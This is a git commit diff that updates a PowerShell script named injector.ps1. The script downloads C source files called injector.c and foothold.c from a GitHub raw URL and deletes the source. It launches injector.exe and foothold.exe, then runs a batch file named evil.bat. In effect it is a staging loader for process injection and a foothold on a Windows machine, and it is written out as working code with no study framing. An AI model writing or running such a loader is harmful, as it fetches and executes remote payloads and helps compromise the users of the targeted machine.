876d43664e1ddcc92dfc37481d9b5fc2074c717e
lacouls <62086637+lacouls@users.noreply.github.com>
2025-03-17 14:48:33 +0800

    Update injector.ps1

--- injector.ps1
+++ injector.ps1
@@ -1,6 +1,9 @@
 
 #Download injector.c
-(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/injector.c', 'c:\Users\saurav\Desktop\injector1.c')
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/injector.c', 'c:\Users\saurav\Desktop\injector.c')
+#Download injector.c
+#(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/foothold.c', 'c:\Users\saurav\Desktop\foothold.c')
+
 
 #sleep for 10 second
 start-sleep -s 10
@@ -14,14 +17,23 @@ Start-Sleep -s 5
 #remove the injector.c
 Remove-Item -path "C:\Users\saurav\Desktop\injector.c"
 
+#compiles the c code to generated executable
+#cmd.exe /c 'gcc "C:\Users\saurav\Desktop\foothold.c" -o "C:\Users\saurav\Desktop\foothold.exe"'
+
+#sleep for 5 second
+Start-sleep -s 5
+
 #execute the injector.exe
 Start-Process -filepath "C:\Users\saurav\Desktop\injector.exe" 
 
+
+start-sleep -s 5
+#remove the injector.c
+#Remove-Item -path "C:\Users\saurav\Desktop\foothold.c"
+
+#execute the foothold.exe
+Start-Process -filepath "C:\Users\saurav\Desktop\foothold.exe" 
+
+Start-sleep -s 10
 #execute batch file
-Invoke-Expression -command "C:\users\saurav\temp\evil.bat"
-
-
-
-
-
-
+cmd.exe /c "C:\users\saurav\temp\evil.bat"
